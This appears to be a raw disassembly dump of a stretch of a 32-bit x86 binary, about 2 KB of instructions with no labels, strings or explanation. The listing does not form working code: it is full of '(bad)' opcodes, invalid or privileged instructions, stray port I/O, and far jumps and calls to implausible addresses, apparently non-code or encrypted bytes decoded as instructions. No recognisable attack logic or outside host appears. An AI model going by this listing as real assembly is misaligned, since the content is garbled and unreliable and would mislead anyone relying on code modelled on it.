  4126aa:	and    eax,0x329df0a7
  4126af:	aad    0xfe
  4126b1:	mov    BYTE PTR cs:[eax-0x1c],ah
  4126b5:	rol    BYTE PTR [edi+0x6c],0x2b
  4126b9:	push   0xd314b1c5
  4126be:	addr16 xor eax,0x11fe3934
  4126c4:	sub    DWORD PTR [ebp+0x6ae6da03],edi
  4126ca:	out    0xd3,eax
  4126cc:	mov    dl,0x49
  4126ce:	rep outs dx,BYTE PTR ds:[esi]
  4126d0:	loop   0x412696
  4126d2:	jbe    0x4126fe
  4126d4:	addr16 add eax,esp
  4126d7:	dec    DWORD PTR [edi+0x67]
  4126da:	mov    al,ds:0xf7fd0035
  4126df:	popa   
  4126e0:	jbe    0x412725
  4126e2:	pop    ss
  4126e3:	jecxz  0x412763
  4126e5:	pop    es
  4126e6:	or     bh,BYTE PTR [ebx+0x3c]
  4126e9:	arpl   WORD PTR ds:0xa92825f8,cx
  4126ef:	(bad)  
  4126f1:	adc    al,0x10
  4126f3:	rol    BYTE PTR [ecx-0x3dba828c],0x67
  4126fa:	call   0xd35f8b13
  4126ff:	or     BYTE PTR [ecx],dl
  412701:	mov    ds:0xb609a989,eax
  412706:	test   DWORD PTR [ebx+esi*1],ebx
  412709:	es pop ebx
  41270b:	ds iret 
  41270d:	add    al,0x25
  41270f:	adc    ch,0x62
  412712:	inc    esp
  412713:	jb     0x4126fa
  412715:	cwde   
  412716:	and    eax,0xfae6024b
  41271b:	fadd   st(4),st
  41271d:	imul   eax,edi,0x46
  412720:	push   eax
  412721:	mov    edx,0x37587a4e
  412726:	inc    ecx
  412727:	mov    cl,0xab
  412729:	sbb    ecx,edx
  41272b:	adc    DWORD PTR ds:0xd7015da0,ebp
  412731:	mov    dl,0x9f
  412733:	pushf  
  412734:	mov    ds:0x2b160bde,al
  412739:	cmp    BYTE PTR [eax],bl
  41273b:	(bad)  
  41273c:	cli    
  41273d:	pop    es
  41273e:	or     eax,0x195e166b
  412743:	or     esp,ecx
  412745:	popf   
  412746:	add    ch,BYTE PTR [eax+0x53]
  412749:	std    
  41274a:	and    eax,0xfa3c35e3
  41274f:	ror    DWORD PTR [esi+0x3c],1
  412752:	sbb    bl,ch
  412754:	xchg   BYTE PTR [ebx+ebp*2],bh
  412757:	clc    
  412758:	hlt    
  412759:	xchg   edx,eax
  41275a:	add    al,0xe8
  41275c:	in     eax,0x1b
  41275e:	jge    0x412709
  412760:	mov    dh,0xb0
  412762:	addr16 mov bh,0x3b
  412765:	clc    
  412766:	imul   esi,DWORD PTR [edx+0x44],0x4d
  41276a:	push   ss
  41276b:	pop    ss
  41276c:	sub    DWORD PTR [edx+0x2b],edi
  41276f:	inc    edx
  412770:	add    eax,edi
  412772:	push   ds
  412773:	sbb    esi,DWORD PTR [edi]
  412775:	xchg   BYTE PTR [edi-0x22f95970],dl
  41277b:	lock dec ebp
  41277d:	xor    BYTE PTR fs:[edx],0xa5
  412781:	pop    ebp
  412782:	pop    ecx
  412783:	in     al,0xae
  412785:	cld    
  412786:	dec    esp
  412787:	xchg   edi,edi
  412789:	arpl   WORD PTR [eax-0x35],ax
  41278c:	adc    al,cl
  41278e:	jno    0x41275d
  412790:	xor    edi,DWORD PTR [eax+edx*4-0x1487f77e]
  412797:	pop    esp
  412798:	outs   dx,BYTE PTR ds:[esi]
  412799:	jmp    0x50ad:0xe7a68a8c
  4127a0:	popa   
  4127a1:	mov    al,0xf1
  4127a3:	cmp    bl,dl
  4127a5:	imul   BYTE PTR [ecx+0x5d]
  4127a8:	test   al,0x5c
  4127aa:	inc    ebp
  4127ab:	xchg   ebx,eax
  4127ac:	stos   DWORD PTR es:[edi],eax
  4127ad:	mov    ch,0x72
  4127af:	fst    QWORD PTR [ebp+eiz*2-0x65]
  4127b3:	loopne 0x4127f1
  4127b5:	push   edx
  4127b6:	xchg   esi,eax
  4127b7:	out    0x1a,al
  4127b9:	cdq    
  4127ba:	popa   
  4127bb:	stos   DWORD PTR es:[edi],eax
  4127bc:	dec    esp
  4127bd:	and    BYTE PTR [ebx],0x9e
  4127c0:	mov    dh,0x18
  4127c2:	repz add eax,0x6e2a321c
  4127c8:	cmp    cl,al
  4127ca:	test   DWORD PTR [eax],edi
  4127cc:	test   DWORD PTR [ebp-0x1b],ecx
  4127cf:	xchg   esi,eax
  4127d0:	mov    bh,0x10
  4127d2:	ret    
  4127d3:	in     al,0xd8
  4127d5:	adc    eax,0xee97795e
  4127da:	jge    0x4127c7
  4127dc:	jp     0x4127ae
  4127de:	dec    eax
  4127df:	in     eax,0x4d
  4127e1:	push   ss
  4127e2:	mov    dh,0x8b
  4127e4:	xchg   BYTE PTR [edi+0x8e039a8],ch
  4127ea:	loop   0x4127e5
  4127ec:	cmp    al,BYTE PTR [ebx+0x9]
  4127ef:	xchg   ecx,eax
  4127f0:	dec    esi
  4127f1:	jnp    0x412816
  4127f3:	into   
  4127f4:	inc    esi
  4127f5:	xor    bh,al
  4127f7:	mov    bh,0xfa
  4127f9:	xchg   ebx,eax
  4127fa:	mov    al,0xe2
  4127fc:	hlt    
  4127fd:	mul    BYTE PTR [esi-0x290a2227]
  412803:	adc    eax,0xd5fe8f96
  412808:	ins    DWORD PTR es:[edi],dx
  412809:	mov    al,ds:0xa44b4e5
  41280e:	hlt    
  41280f:	outs   dx,BYTE PTR ds:[esi]
  412810:	jecxz  0x4127ef
  412812:	mov    edi,0x782be480
  412817:	xor    eax,0xd02e6f3c
  41281c:	jo     0x4127e8
  41281e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41281f:	scas   eax,DWORD PTR es:[edi]
  412820:	loope  0x41284d
  412822:	leave  
  412823:	ret    
  412824:	sti    
  412825:	pushf  
  412826:	inc    edx
  412827:	inc    ebp
  412828:	xchg   ebx,eax
  412829:	mov    edx,0x2f002946
  41282e:	adc    al,0x59
  412830:	dec    edx
  412831:	lea    esp,[edi]
  412833:	mov    edi,0x50081cbc
  412838:	push   edx
  412839:	das    
  41283a:	jb     0x412844
  41283c:	xor    al,0x87
  41283e:	loop   0x41284c
  412840:	outs   dx,DWORD PTR cs:[esi]
  412842:	cmp    eax,0x2f05ca18
  412847:	std    
  412848:	and    edi,eax
  41284a:	sub    DWORD PTR [ecx+0x33350858],edx
  412850:	mov    ds:0x2acd0bfc,eax
  412855:	and    al,0xe0
  412857:	xor    eax,0x6df9c13
  41285c:	mov    edx,0xf7d59035
  412861:	js     0x41286f
  412863:	mov    ebp,0x161086f2
  412868:	xchg   ebx,eax
  412869:	pushf  
  41286a:	loop   0x412823
  41286c:	fstp   st(3)
  41286e:	jb     0x412800
  412870:	lods   al,BYTE PTR ds:[esi]
  412871:	shl    DWORD PTR [eax+0x3b],cl
  412874:	outs   dx,BYTE PTR ds:[esi]
  412875:	jb     0x41283a
  412877:	lahf   
  412878:	jge    0x412891
  41287a:	aaa    
  41287b:	pop    ebx
  41287c:	add    BYTE PTR [ebp-0x59],0x7a
  412880:	adc    dh,BYTE PTR [ebx-0x64]
  412883:	xchg   ebp,eax
  412884:	inc    edx
  412885:	fisub  DWORD PTR ds:0xc43f32ca
  41288b:	ficom  WORD PTR [eax]
  41288d:	mov    DWORD PTR [ebp-0x21],ebx
  412890:	push   esp
  412891:	push   es
  412892:	ret    0xb333
  412895:	jmp    0x75344948
  41289a:	shr    DWORD PTR [esi],cl
  41289c:	popa   
  41289d:	jbe    0x412912
  41289f:	xor    ah,BYTE PTR [ebp-0x7c]
  4128a2:	dec    ebx
  4128a3:	in     al,0xe3
  4128a5:	mov    esi,0xad8b2855
  4128aa:	jo     0x41291e
  4128ac:	sbb    al,0xec
  4128ae:	mov    esp,0x6c0f3228
  4128b3:	and    edi,0xd8abd7d3
  4128b9:	sti    
  4128ba:	cld    
  4128bb:	(bad)  
  4128bc:	sbb    BYTE PTR [edi-0x58a94252],dl
  4128c2:	xor    dh,BYTE PTR [edx]
  4128c4:	leave  
  4128c5:	xchg   ebp,ecx
  4128c7:	xlat   BYTE PTR ds:[ebx]
  4128c8:	mov    al,0xec
  4128ca:	push   edi
  4128cb:	mov    dl,0xfd
  4128cd:	add    DWORD PTR [edx],edi
  4128cf:	(bad)  
  4128d0:	dec    edi
  4128d1:	imul   esp,esi,0x7b761dee
  4128d7:	call   0x8812:0x81132084
  4128de:	dec    esp
  4128df:	in     al,dx
  4128e0:	cmp    BYTE PTR [esi],bh
  4128e2:	sti    
  4128e3:	jp     0x41295d
  4128e5:	sbb    edi,DWORD PTR [ebx]
  4128e7:	iret   
  4128e8:	mov    WORD PTR [edi-0x33acfde1],gs
  4128ee:	inc    ecx
  4128ef:	sbb    eax,0xcbc178ed
  4128f4:	jle    0x4128fb
  4128f6:	and    BYTE PTR [ebx],al
  4128f8:	add    al,0x13
  4128fa:	pushf  
  4128fb:	mov    bl,0x95
  4128fd:	lock fs retf 
  412900:	jp     0x41290b
  412902:	mov    ebx,0x1b614ea
  412907:	ficom  DWORD PTR [ecx-0x5875dda6]
  41290d:	fnsave [ecx]
  41290f:	mov    eax,ds:0xfb8ca8b8
  412914:	repnz rcl DWORD PTR [ebx],cl
  412917:	aad    0x47
  412919:	lods   eax,DWORD PTR ds:[esi]
  41291a:	out    dx,al
  41291b:	lods   al,BYTE PTR ds:[esi]
  41291c:	cmp    DWORD PTR [ebp+0x54],ebp
  41291f:	jbe    0x412926
  412921:	mov    edx,DWORD PTR [eax]
  412923:	or     eax,0x61bc81d8
  412928:	mov    dl,0x50
  41292a:	adc    DWORD PTR es:[ecx+0x5a],ecx
  41292e:	repz aam 0x2b
  412931:	jmp    0x4128e3
  412933:	clc    
  412934:	mov    cl,0x88
  412936:	cmp    ah,BYTE PTR [ecx-0x70]
  412939:	adc    dl,0xe0
  41293c:	push   edx
  41293d:	outs   dx,BYTE PTR ds:[esi]
  41293e:	mov    al,ds:0xe94347f3
  412943:	adc    DWORD PTR [ecx-0x6f92cd18],ebx
  412949:	cmp    DWORD PTR [ecx+0x26198842],esp
  41294f:	mov    eax,ds:0x8b4c3c6a
  412954:	iret   
  412955:	gs push edi
  412957:	sbb    ebx,0x43
  41295a:	pop    es
  41295b:	dec    edi
  41295c:	retf   0x137
  41295f:	push   edx
  412960:	push   esi
  412961:	(bad)  
  412962:	(bad)  
  412963:	pop    esp
  412964:	add    BYTE PTR gs:[esi],bl
  412967:	push   ecx
  412968:	aam    0x3c
  41296a:	push   ebx
  41296b:	xor    al,0x30
  41296d:	rol    BYTE PTR [eax],0x6f
  412970:	xor    DWORD PTR [edi+0x137f81d6],ecx
  412976:	inc    eax
  412977:	inc    eax
  412978:	stos   DWORD PTR es:[edi],eax
  412979:	fcomp  DWORD PTR [esi]
  41297b:	les    eax,FWORD PTR [ecx]
  41297d:	int    0xc6
  41297f:	push   cs
  412980:	sahf   
  412981:	stos   BYTE PTR es:[edi],al
  412982:	das    
  412983:	ja     0x412996
  412985:	lock pop esp
  412987:	scas   eax,DWORD PTR es:[edi]
  412988:	loopne 0x41293b
  41298a:	pop    ebp
  41298b:	jo     0x4129e7
  41298d:	or     eax,ebx
  41298f:	cdq    
  412990:	push   ss
  412991:	mov    al,0xe4
  412993:	cmp    BYTE PTR [ebx-0x5545c45],bh
  412999:	lock adc DWORD PTR [esi+edi*1-0x5],esp
  41299e:	xor    DWORD PTR [esi],0xddfa1977
  4129a4:	inc    ebp
  4129a5:	pop    edi
  4129a6:	sub    DWORD PTR ss:[ebp+eax*4+0x4f],esp
  4129ab:	sub    ebp,eax
  4129ad:	inc    esi
  4129ae:	fwait
  4129af:	leave  
  4129b0:	mov    esi,0x81d56115
  4129b5:	sbb    dh,dl
  4129b7:	dec    ebx
  4129b8:	sbb    eax,0xd23b40bb
  4129bd:	dec    edi
  4129be:	cmp    bl,BYTE PTR [edi-0x40]
  4129c1:	hlt    
  4129c2:	or     ch,BYTE PTR [ecx]
  4129c4:	gs adc edx,0xffffffd2
  4129c8:	xchg   ecx,eax
  4129c9:	push   0xb7267849
  4129ce:	push   ebp
  4129cf:	ds dec ebx
  4129d1:	dec    ecx
  4129d2:	pop    es
  4129d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129d4:	retf   
  4129d5:	xor    al,0x44
  4129d7:	push   edx
  4129d8:	in     al,0xc3
  4129da:	daa    
  4129db:	jmp    0x412a3c
  4129dd:	mov    ds,WORD PTR [edi]
  4129df:	ins    BYTE PTR es:[edi],dx
  4129e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129e1:	jp     0x412a20
  4129e3:	xor    DWORD PTR [edi],esp
  4129e5:	pop    eax
  4129e6:	adc    DWORD PTR [edx+edx*4-0x25cf2b50],eax
  4129ed:	cmp    al,0x24
  4129ef:	jno    0x412995
  4129f1:	fxch   st(1)
  4129f3:	cmp    DWORD PTR [ecx+0x18],edi
  4129f6:	pop    es
  4129f7:	jnp    0x4129cf
  4129f9:	dec    edi
  4129fa:	cmp    esi,DWORD PTR ds:0x63ae465d
  412a00:	dec    ebp
  412a01:	push   eax
  412a02:	sub    eax,0x74f9c098
  412a07:	pop    es
  412a08:	mov    esp,0x81ccc85
  412a0d:	cdq    
  412a0e:	ss pop ds
  412a10:	call   0xa3d1bb31
  412a15:	mov    esp,0x125e6058
  412a1a:	sar    DWORD PTR [ecx+ebx*1-0x53],cl
  412a1e:	(bad)  
  412a1f:	xor    bl,BYTE PTR [ecx+0x4ef3d5bc]
  412a25:	xlat   BYTE PTR ds:[ebx]
  412a26:	in     al,0x92
  412a28:	ja     0x412a84
  412a2a:	lods   eax,DWORD PTR ss:[esi]
  412a2c:	xor    bh,BYTE PTR [esi-0x2a]
  412a2f:	call   0xf28a:0xf36414fd
  412a36:	dec    eax
  412a37:	sbb    dh,BYTE PTR [edi-0xd266cd1]
  412a3d:	adc    BYTE PTR [edi-0x6a8df5c7],al
  412a43:	mov    ch,0xdd
  412a45:	cmp    DWORD PTR [eax+0x7565f632],ecx
  412a4b:	xchg   edx,eax
  412a4c:	and    ch,BYTE PTR [edx+0x15af229b]
  412a52:	iret   
  412a53:	mov    DWORD PTR [ebp+eax*4-0x4e671a63],ecx
  412a5a:	pop    es
  412a5b:	mov    ecx,DWORD PTR [ebx+0x205d773d]
  412a61:	adc    edx,edi
  412a63:	jle    0x412ad3
  412a65:	outs   dx,BYTE PTR ds:[esi]
  412a66:	(bad)  
  412a67:	repz in al,0xbb
  412a6a:	push   esp
  412a6b:	sub    eax,0x674c116f
  412a70:	add    BYTE PTR [ebx-0x12],dl
  412a73:	cmp    eax,0x320688f7
  412a78:	(bad)  
  412a79:	out    0xf5,al
  412a7b:	push   es
  412a7c:	fwait
  412a7d:	test   al,0xa5
  412a7f:	push   eax
  412a80:	stos   BYTE PTR es:[edi],al
  412a81:	or     eax,0xc314ef27
  412a86:	xchg   DWORD PTR [edx],edi
  412a88:	out    0xd8,al
  412a8a:	leave  
  412a8b:	jle    0x412a45
  412a8d:	sub    DWORD PTR [esi+0xfa5279f],esp
  412a93:	jmp    0xa76f:0x64c65e86
  412a9a:	pop    eax
  412a9b:	call   0x81d53d5f
  412aa0:	sbb    eax,0x951e54b2
  412aa5:	inc    eax
  412aa6:	shl    DWORD PTR [esi],cl
  412aa8:	rcl    DWORD PTR [eax+0x69],0xbd
  412aac:	test   eax,0x1f3508ff
  412ab1:	into   
  412ab2:	dec    esi
  412ab3:	loope  0x412ae5
  412ab5:	pop    ebp
  412ab6:	jecxz  0x412a77
  412ab8:	add    al,0xba
  412aba:	(bad)  
  412abc:	inc    ebp
  412abd:	cmp    BYTE PTR [esi-0x8f70904],0x12
  412ac4:	(bad)  
  412ac5:	adc    bh,BYTE PTR [ebx-0x22]
  412ac8:	and    al,0x33
  412aca:	in     al,dx
  412acb:	int    0x2c
  412acd:	and    al,BYTE PTR [esi]
  412acf:	mov    dh,0xa8
  412ad1:	in     al,dx
  412ad2:	mov    esp,DWORD PTR [edx]
  412ad4:	jne    0x412a83
  412ad6:	cmp    ah,al
  412ad8:	repnz sbb ah,ch
  412adb:	lahf   
  412adc:	out    0x86,eax
  412ade:	clc    
  412adf:	test   esi,esp
  412ae1:	add    cl,BYTE PTR [esi]
  412ae3:	sub    edi,eax
  412ae5:	arpl   WORD PTR [edi+0x7a5ae925],bp
  412aeb:	cmp    DWORD PTR [ecx-0x6ed6a990],0x1b
  412af2:	out    dx,eax
  412af3:	ja     0x412aab
  412af5:	mov    ah,0x16
  412af7:	mov    edi,0x2527a254
  412afc:	lods   eax,DWORD PTR ds:[esi]
  412afd:	jae    0x412b73
  412aff:	pop    ecx
  412b00:	fstp   DWORD PTR [eax+ebp*2]
  412b03:	mov    DWORD PTR [edx-0x999ec32],edi
  412b09:	lock xor ebx,DWORD PTR [edi+eax*8]
  412b0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b0e:	(bad)  
  412b0f:	and    eax,0x6e875589
  412b14:	aad    0x59
  412b16:	push   ds
  412b17:	pop    ebx
  412b18:	push   esi
  412b19:	cmp    al,0xc4
  412b1b:	sub    ebx,DWORD PTR [eax]
  412b1d:	add    al,BYTE PTR [edx]
  412b1f:	mov    bl,0x52
  412b21:	jmp    0xd1e5:0x16834e55
  412b28:	shl    DWORD PTR [esi],cl
  412b2a:	inc    ebp
  412b2b:	call   0xed85:0x775c601d
  412b32:	dec    edi
  412b33:	pop    edi
  412b34:	aam    0xeb
  412b36:	pop    ebx
  412b37:	adc    al,0x32
  412b39:	adc    ecx,DWORD PTR [ebx-0x53]
  412b3c:	pusha  
  412b3d:	(bad)  
  412b3e:	mov    ds,WORD PTR [eax+0x2086eae1]
  412b44:	sub    dh,ch
  412b46:	push   es
  412b47:	pop    ss
  412b48:	dec    eax
  412b49:	in     eax,dx
  412b4a:	fadd   st,st(7)
  412b4c:	and    DWORD PTR [esi+0x5f],0xfffffff5
  412b50:	sub    BYTE PTR [edi],bl
  412b52:	sti    
  412b53:	mov    edi,0xeb30125c
  412b58:	int3   
  412b59:	sbb    al,0x56
  412b5b:	lahf   
  412b5c:	call   0x1666f49d
  412b61:	or     BYTE PTR [edx],ah
  412b63:	mov    dl,0x97
  412b65:	jecxz  0x412b5c
  412b67:	cmp    BYTE PTR [eax+ebx*2+0x2c3c1c73],dl
  412b6e:	fisttp QWORD PTR [ebx]
  412b70:	mov    cl,0xde
  412b72:	imul   esi,DWORD PTR [eax-0x7b],0xf544160e
  412b79:	xchg   esi,eax
  412b7a:	mov    ds:0x5bf7301d,al
  412b7f:	dec    ebx
  412b80:	sbb    dh,BYTE PTR [ebp+0x28368ed7]
  412b86:	aam    0x8f
  412b88:	pushf  
  412b89:	push   eax
  412b8a:	adc    BYTE PTR [ebp-0x34],al
  412b8d:	popa   
  412b8e:	out    0x40,eax
  412b90:	aaa    
  412b91:	cmp    ecx,DWORD PTR [ebx]
  412b93:	push   0x9049661
  412b98:	inc    ebp
  412b99:	xchg   esp,eax
  412b9a:	adc    bl,BYTE PTR [esi-0x17]
  412b9d:	cmp    edx,DWORD PTR [ecx+0x77]
  412ba0:	mov    WORD PTR [bp-0x4380],es
  412ba5:	push   esi
  412ba6:	retf   
  412ba7:	iret   
  412ba8:	mov    bh,0x52
  412baa:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  412bac:	in     eax,dx
  412bad:	call   0x841e:0x62516c3e
  412bb4:	in     eax,dx
  412bb5:	xchg   ecx,eax
  412bb6:	xchg   ebx,eax
  412bb7:	xor    ebp,0x9cec2cbf
  412bbd:	adc    al,0x8b
  412bbf:	mov    ah,ah
  412bc1:	and    BYTE PTR [esi+0x3],dl
  412bc4:	add    dh,dh
  412bc6:	mov    al,ds:0x539446a7
  412bcb:	retf   
  412bcc:	mov    DWORD PTR [esi],esp
  412bce:	pop    esp
  412bcf:	ja     0x412be3
  412bd1:	xlat   BYTE PTR ds:[ebx]
  412bd2:	jbe    0x412b9f
  412bd4:	jno    0x412bf7
  412bd6:	test   DWORD PTR ds:0x83e543c5,ebx
  412bdc:	or     ah,BYTE PTR [edi+0x63e32ae9]
  412be2:	repz jl 0x412bc6
  412be5:	in     al,0x6a
  412be7:	shl    cl,0xee
  412bea:	out    dx,al
  412beb:	and    dl,BYTE PTR [ebx-0x3ebaa9b5]
  412bf1:	das    
  412bf2:	sbb    eax,0x49d76984
  412bf7:	and    DWORD PTR [edx-0x4f],esp
  412bfa:	pop    ds
  412bfb:	ins    DWORD PTR es:[edi],dx
  412bfc:	popa   
  412bfd:	stos   DWORD PTR es:[edi],eax
  412bfe:	push   esi
  412bff:	ss aaa 
  412c01:	jp     0x412c2b
  412c03:	ror    DWORD PTR [ebx],0x21
  412c06:	repnz push ebx
  412c08:	add    edx,ebx
  412c0a:	js     0x412ba2
  412c0c:	aas    
  412c0d:	push   esi
  412c0e:	adc    eax,0x95881299
  412c13:	xor    ebx,DWORD PTR [ecx-0x35]
  412c16:	and    DWORD PTR [ebx],ebx
  412c18:	rcl    DWORD PTR ds:0x872eda27,cl
  412c1e:	pand   mm7,QWORD PTR [edx-0x19]
  412c22:	ins    DWORD PTR es:[edi],dx
  412c23:	rcr    BYTE PTR [ecx],cl
  412c25:	sub    eax,0x3830fef
  412c2a:	lods   eax,DWORD PTR ds:[esi]
  412c2b:	sahf   
  412c2c:	ror    ebp,0x66
  412c2f:	and    eax,0xde510f17
  412c34:	(bad)  
  412c35:	out    0x8b,eax
  412c37:	pop    ds
  412c38:	pop    ecx
  412c39:	pop    ds
  412c3a:	popf   
  412c3b:	mov    esi,0x78897320
  412c40:	ss mov edx,ds
  412c43:	cmp    edx,ecx
  412c45:	daa    
  412c46:	sbb    al,0x39
  412c48:	mov    dh,0x1
  412c4a:	xchg   esp,eax
  412c4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c4c:	push   0x9
  412c4e:	repnz clc 
  412c50:	vmovhps QWORD PTR [eax+ebx*2+0x62],xmm6
  412c56:	push   ecx
  412c57:	mov    bh,0x83
  412c59:	push   esp
  412c5a:	xor    eax,0xac019001
  412c5f:	jne    0x412c0e
  412c61:	stos   DWORD PTR es:[edi],eax
  412c62:	adc    eax,0x398d55df
  412c67:	aaa    
  412c68:	arpl   WORD PTR [ecx+eax*4],si
  412c6b:	pushf  
  412c6c:	cmp    al,0x74
  412c6e:	fldcw  WORD PTR [edi]
  412c70:	dec    eax
  412c71:	sub    BYTE PTR [esi-0x20593c8f],cl
  412c77:	jmp    0x473a:0x1c91b1c5
  412c7e:	sub    edx,DWORD PTR [esi]
  412c80:	scas   eax,DWORD PTR es:[edi]
  412c81:	inc    eax
  412c82:	mov    dl,0xd4
  412c85:	loopne 0x412cf4
  412c87:	enter  0x43e8,0x45
  412c8b:	sub    al,0x1d
  412c8d:	jp     0x412c59
  412c8f:	mov    edx,0x604d02f4
  412c94:	iret   
  412c95:	loop   0x412ce7
  412c97:	push   ebx
  412c98:	or     eax,0xc817399b
  412c9d:	call   0x27afcde2
  412ca2:	push   es
  412ca3:	or     bl,BYTE PTR [edi+edx*8+0x4737890f]
  412caa:	push   ebp
  412cab:	sub    DWORD PTR [ebx-0x43c1c359],eax
  412cb1:	xchg   edi,eax
  412cb2:	mov    edi,0xc1ba9b91
  412cb7:	arpl   WORD PTR [ecx+0x1e803fad],sp
  412cbd:	adc    eax,0x7a9d4902
  412cc2:	inc    ebx
  412cc3:	mov    dh,0x7d
  412cc5:	mov    ebx,0x9dc646ec
  412cca:	cli    
  412ccb:	push   cs
  412ccc:	jae    0x412d3e
  412cce:	out    dx,al
  412ccf:	sbb    DWORD PTR [ebx],ebx
  412cd1:	nop
  412cd2:	lds    esp,FWORD PTR [ecx]
  412cd4:	imul   eax,DWORD PTR ds:0xa6cb0840,0x8557f61e
  412cde:	mov    eax,DWORD PTR [edi-0x66]
  412ce1:	inc    esi
  412ce2:	xchg   BYTE PTR [ecx],ch
  412ce4:	ret    0x7979
  412ce7:	stos   DWORD PTR es:[edi],eax
  412ce8:	popf   
  412ce9:	sbb    cl,BYTE PTR [ecx+edx*2-0xfb804db]
  412cf0:	mov    esp,0x2afd6f21
  412cf5:	neg    ebp
  412cf7:	cmc    
  412cf8:	sub    al,0x47
  412cfa:	pop    edi
  412cfb:	inc    esi
  412cfc:	xchg   ecx,eax
  412cfd:	mov    dl,BYTE PTR [esi+0x27]
  412d00:	ffreep st(5)
  412d02:	xchg   ch,ch
  412d04:	pop    ss
  412d05:	scas   al,BYTE PTR es:[edi]
  412d06:	xlat   BYTE PTR ds:[ebx]
  412d07:	das    
  412d08:	arpl   WORD PTR [esi+0x2],di
  412d0b:	dec    esp
  412d0c:	pusha  
  412d0d:	mov    bh,0x9
  412d0f:	pop    ecx
  412d10:	mov    WORD PTR [eax+esi*8],gs
  412d13:	or     al,0xdf
  412d15:	inc    ecx
  412d16:	cmc    
  412d17:	pop    ebp
  412d18:	aad    0xae
  412d1a:	ret    
  412d1b:	push   cs
  412d1c:	cmp    ebx,ebx
  412d1e:	jno    0x412cee
  412d20:	rcr    esi,0x86
  412d23:	or     ecx,0x471347a6
  412d29:	sbb    BYTE PTR [ecx+ebx*4+0x13f05613],bh
  412d30:	jbe    0x412d07
  412d32:	lock stc 
  412d34:	rcl    dl,0x2d
  412d37:	push   es
  412d38:	in     al,0x9e
  412d3a:	sub    dl,BYTE PTR [eax+0x50]
  412d3d:	call   0x7aa7:0xb16d456c
  412d44:	xchg   ebx,eax
  412d45:	iret   
  412d46:	ins    DWORD PTR es:[edi],dx
  412d47:	lods   eax,DWORD PTR ds:[esi]
  412d48:	dec    eax
  412d49:	fcmovne st,st(6)
  412d4b:	mov    ebx,DWORD PTR [ebx-0x15eb88d2]
  412d51:	clc    
  412d52:	add    bh,ch
  412d54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d55:	pop    edi
  412d56:	adc    eax,0x42ad00e6
  412d5b:	out    dx,al
  412d5c:	ins    DWORD PTR es:[edi],dx
  412d5d:	dec    esi
  412d5e:	sahf   
  412d5f:	mov    edx,0xe6dd1c70
  412d64:	jns    0x412cf5
  412d66:	jbe    0x412ce8
  412d68:	mov    ah,0x75
  412d6a:	inc    ebp
  412d6b:	out    dx,eax
  412d6c:	fistp  DWORD PTR [edi-0x30]
  412d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d70:	add    cl,BYTE PTR [edx-0x6f91324a]
  412d76:	adc    eax,0xc05c81e2
  412d7b:	push   esi
  412d7c:	ss sahf 
  412d7e:	xor    al,0x6b
  412d80:	(bad)  [eax-0x5a]
  412d83:	dec    eax
  412d84:	out    dx,al
  412d85:	mov    esp,0xdb06d906
  412d8a:	mov    ebp,0xb28e00d8
  412d8f:	daa    
  412d90:	push   esp
  412d91:	pop    ds
  412d92:	push   ds
  412d93:	or     al,0x9b
  412d95:	loope  0x412db4
  412d97:	mov    bh,0x19
  412d99:	add    eax,0xfac21dc4
  412d9e:	mov    dh,0x3d
  412da0:	adc    DWORD PTR [ebp+0x1e],edx
  412da3:	dec    ecx
  412da4:	in     eax,dx
  412da5:	fidiv  DWORD PTR [edx]
  412da7:	inc    edi
  412da8:	icebp  
  412da9:	pusha  
  412daa:	jmp    0xd510:0x9a80fdb1
  412db1:	test   DWORD PTR [edi-0xb51f02],esp
  412db7:	cmp    edx,edi
  412db9:	jnp    0x412e05
  412dbb:	je     0x412e0b
  412dbd:	inc    esi
  412dbe:	scas   eax,DWORD PTR es:[edi]
  412dbf:	in     al,dx
  412dc0:	test   BYTE PTR [ecx],ah
  412dc2:	sbb    al,0x7
  412dc4:	cmp    al,0xc7
  412dc6:	push   es
  412dc7:	sahf   
  412dc8:	dec    ecx
  412dc9:	cmp    al,0x68
  412dcb:	jl     0x412d86
  412dcd:	push   edx
  412dce:	test   eax,0xee4e42b8
  412dd3:	xor    edi,ebx
  412dd5:	aaa    
  412dd6:	mov    BYTE PTR [edi+eiz*1],bl
  412dd9:	cmp    ecx,DWORD PTR [ebp-0x5a]
  412ddc:	mov    eax,0xbac534fa
  412de1:	mov    ch,0xf5
  412de3:	cmp    eax,0x601734da
  412de8:	int3   
  412de9:	test   DWORD PTR [ebp+0x73abb3cc],ecx
  412def:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412df0:	xor    eax,0x69ed039c
  412df5:	imul   ecx,DWORD PTR [ebp-0x6871448f],0xffffffee
  412dfc:	popf   
  412dfd:	jle    0x412e57
  412dff:	imul   ecx,esi,0xffffffca
  412e02:	out    0x44,eax
  412e04:	mov    eax,0xf56ce2ff
  412e09:	or     DWORD PTR [edi+0x6eb52a08],ebx
  412e0f:	sub    dl,BYTE PTR [edx+edx*4]
  412e12:	dec    ebp
  412e13:	sub    dh,bh
  412e15:	mov    fs,ebx
  412e17:	xor    dh,0x33
  412e1a:	mov    eax,0x21675a1f
  412e1f:	dec    ecx
  412e20:	mov    eax,cr7
  412e23:	fcomp  QWORD PTR [esp+eiz*8+0x424904cb]
  412e2a:	mov    ds:0x4725b7b4,eax
  412e2f:	adc    DWORD PTR [eax+0x1863ab9d],0x27
  412e36:	arpl   WORD PTR [ebx],cx
  412e38:	lea    edi,[ecx+edx*1-0x5b]
  412e3c:	lods   eax,DWORD PTR ds:[esi]
  412e3d:	les    ebp,FWORD PTR [esi]
  412e3f:	retf   0x3cf0
  412e42:	rcl    DWORD PTR [ecx-0x3a],0xb3
  412e46:	add    eax,0xbb2d68c4
  412e4b:	js     0x412eb9
  412e4d:	ret    
  412e4e:	jle    0x412de9
  412e50:	mov    ecx,0x1ea993bb
  412e55:	stos   DWORD PTR es:[edi],eax
  412e56:	mov    dh,0xd4
  412e58:	addr16 daa 
  412e5a:	test   BYTE PTR [ebx-0x54c3b1],cl
  412e60:	mov    ebp,0x47b92b39
  412e65:	cmp    ch,ah
